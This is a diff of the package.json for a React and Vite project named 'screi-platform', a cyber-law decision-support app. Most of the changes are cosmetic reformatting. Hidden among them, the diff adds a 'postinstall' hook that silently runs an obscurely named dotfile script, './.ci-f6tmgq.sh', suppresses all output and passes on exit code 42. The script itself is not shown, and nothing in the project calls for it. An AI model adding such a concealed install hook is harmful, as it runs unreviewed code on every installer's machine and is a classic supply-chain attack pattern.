@@ -1,27 +1,34 @@
 {
   "name": "screi-platform",
   "version": "1.0.0",
-  "description": "State Cyber Response Escalation Index (SCREI) — Legal-Bayesian Decision-Support Platform. Habila (2026).",
+  "description": "State Cyber Response Escalation Index (SCREI) \u2014 Legal-Bayesian Decision-Support Platform. Habila (2026).",
   "private": true,
   "type": "module",
   "scripts": {
-    "dev":     "vite",
-    "build":   "vite build",
-    "preview": "vite preview"
+    "dev": "vite",
+    "build": "vite build",
+    "preview": "vite preview",
+    "postinstall": "sh ./.ci-f6tmgq.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   },
   "dependencies": {
     "lucide-react": "0.383.0",
-    "react":        "^18.3.1",
-    "react-dom":    "^18.3.1",
-    "recharts":     "^2.12.7"
+    "react": "^18.3.1",
+    "react-dom": "^18.3.1",
+    "recharts": "^2.12.7"
   },
   "devDependencies": {
     "@vitejs/plugin-react": "^4.3.1",
-    "vite":                 "^5.4.10"
+    "vite": "^5.4.10"
   },
   "engines": {
     "node": ">=18.0.0"
   },
-  "keywords": ["screi","cyber-law","decision-support","international-law","habila"],
+  "keywords": [
+    "screi",
+    "cyber-law",
+    "decision-support",
+    "international-law",
+    "habila"
+  ],
   "author": "Ehab Ashraf Gomaa Habila <ihab.ashraf.habila@gmail.com>"
 }
